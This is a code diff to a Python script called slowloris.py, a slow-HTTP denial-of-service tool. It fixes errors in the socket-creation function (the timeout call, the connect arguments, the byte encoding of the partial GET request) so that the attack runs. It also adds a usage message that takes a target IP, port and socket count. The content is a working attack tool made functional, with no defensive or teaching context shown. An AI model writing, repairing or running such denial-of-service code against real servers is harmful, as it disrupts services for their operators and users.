@@ -6,9 +6,9 @@ sockets = []
 
 def create_socket(IP, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimout(4) # maybe this line can be removed or set really high idk yet
-    s.connect(IP, port)
-    s.send(f"GET /?{random.randint(1,255)} HTTP/1.1\r\n")
+    s.settimeout(4) # maybe this line can be removed or set really high idk yet
+    s.connect((IP, port))
+    s.send(f"GET /?{random.randint(1,255)} HTTP/1.1\r\n".encode())
     return s
 
 def slowloris(IP, port, socket_count):
@@ -35,6 +35,10 @@ def slowloris(IP, port, socket_count):
 if __name__ == "__main__":
 
     args = sys.argv
+
+    if len(args) != 4:
+        print("Usage: python slowloris.py <IP> <Port> <Socket Count>")
+        sys.exit(1)
 
     IP = args[1]
     port = args[2]
